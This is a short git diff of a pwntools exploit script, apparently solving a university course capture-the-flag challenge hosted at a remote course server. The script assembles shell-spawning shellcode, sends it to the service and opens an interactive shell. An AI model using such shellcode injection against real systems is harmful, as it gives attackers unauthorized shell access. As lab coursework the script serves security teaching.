@@ -18,7 +18,6 @@ def start(argv=[], *a, **kw):
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
-        # return process([exe.path] + argv, *a, **kw)
         return remote("cs412.polygl0ts.ch", 9021)
 
 # Specify your GDB script here for debugging
@@ -40,15 +39,10 @@ continue
 
 io = start()
 
-shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
+# just send a shellcode that spawns a shell. Thanks pwntools.
+shellcode = asm(shellcraft.sh()) 
 io.recv()
 io.send(shellcode)
-# flag = io.recv(...)
-# log.success(flag)
 
 io.interactive()
 
